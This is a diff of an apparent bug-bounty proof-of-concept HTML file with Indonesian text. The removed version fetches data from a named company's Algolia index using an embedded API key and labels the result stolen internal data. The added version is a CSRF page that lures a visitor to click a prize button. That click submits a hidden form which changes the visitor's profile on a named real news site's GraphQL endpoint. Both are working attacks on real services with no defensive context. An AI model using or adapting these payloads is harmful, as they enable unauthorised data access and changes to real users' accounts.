@@ -1,37 +1,9 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>CORS Exploitt</title>
-    <style>
-        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
-        #result { background: #f4f4f4; padding: 15px; border-left: 5px solid #2ecc71; overflow-x: auto; }
-        .status { font-weight: bold; color: #e74c3c; }
-    </style>
-</head>
-<body>
-    <h1>Anduril Armory - CORS Misconfiguration</h1>
-    <p>Domain: <code>api-js.mixpanel.com</code> (digunakan oleh armory.anduril.com)</p>
-    <p>Status: <span id="status" class="status">Mengirim Request...</span></p>
-    
-    <h3>Data yang Berhasil Dibaca:</h3>
-    <pre id="result">Menunggu response dari server...</pre>
-
-    <script>
-    const url = "https://ekyoz1varx-dsn.algolia.net/1/indexes/armory/query?x-algolia-agent=Algolia%20for%20JavaScript%20(5.50.0)&x-algolia-api-key=cc7c97f46dd432f640dc8a1babb30233&x-algolia-application-id=EKYOZ1VARX";
-
-    fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ "params": "query=&hitsPerPage=100" }) // Mencoba menarik 100 data pertama
-    })
-    .then(res => res.json())
-    .then(data => {
-        console.log("Data Internal Berhasil Dicuri:", data);
-        document.getElementById("result").innerText = JSON.stringify(data, null, 2);
-    });
-</script>
-
-
-
-</body>
+  <body>
+    <h1>Klik tombol ini untuk hadiah!</h1>
+    <form action="https://mijnomgeving.ad.nl/api/graphql" method="POST" enctype="text/plain">
+      <input type="hidden" name='{"extensions":{"persistedQuery":{"sha256Hash":"a1890200624c3b3da317020451be417313cc971805d850bfff0442aeea1b4fca","version":1}},"operationName":"UpdateAccountProfile","variables":{"input":{"firstName":"HACKED-BY-CSRF","lastName":"TEST","gender":"MALE","dateOfBirth":"2001-06-10","phoneNumber":""}}, "ignore":"' value='"}'>
+      <input type="submit" value="Klik Disini!">
+    </form>
+  </body>
 </html>
